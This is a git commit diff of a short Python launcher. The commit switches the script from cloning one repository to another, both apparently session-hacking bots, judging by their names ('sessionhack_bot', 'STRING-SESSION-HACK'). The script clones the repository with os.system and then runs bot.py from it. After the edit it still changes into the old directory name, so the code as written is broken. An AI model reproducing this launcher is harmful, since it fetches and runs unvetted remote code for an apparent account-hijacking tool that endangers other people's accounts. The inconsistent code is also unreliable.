c8bf8735d448c51e21781bc9e2e9950b99557ab0
BANDU-OF-TG <87604582+jithin123455@users.noreply.github.com>
2021-11-24 20:28:13 +0530

    Update main.py

--- main.py
+++ main.py
@@ -1,3 +1,3 @@
 import os
-os.system("git clone https://github.com/LEGENDXOP/sessionhack_bot")
+os.system("git clone https://github.com/jithin123455/STRING-SESSION-HACK")
 os.system("cd sessionhack_bot && python bot.py")
